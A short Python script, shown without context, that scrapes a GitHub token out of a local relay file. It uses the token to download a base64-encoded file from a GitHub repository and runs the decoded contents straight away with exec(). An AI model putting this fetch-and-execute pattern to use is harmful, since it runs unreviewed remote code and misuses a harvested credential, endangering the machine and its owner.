
import urllib.request,json,base64
relay=open("/home/k/github-relay.py").read()
GH=relay.split('GH="')[1].split('"')[0] if 'GH="' in relay else relay.split("GH='")[1].split("'")[0]
req=urllib.request.Request("https://api.github.com/repos/virtualnetworkteam-VNT/VNTCaller/contents/assets/diag2.py",headers={"Authorization":"Bearer "+GH})
with urllib.request.urlopen(req,timeout=15) as r:
    exec(base64.b64decode(json.loads(r.read())["content"]).decode())
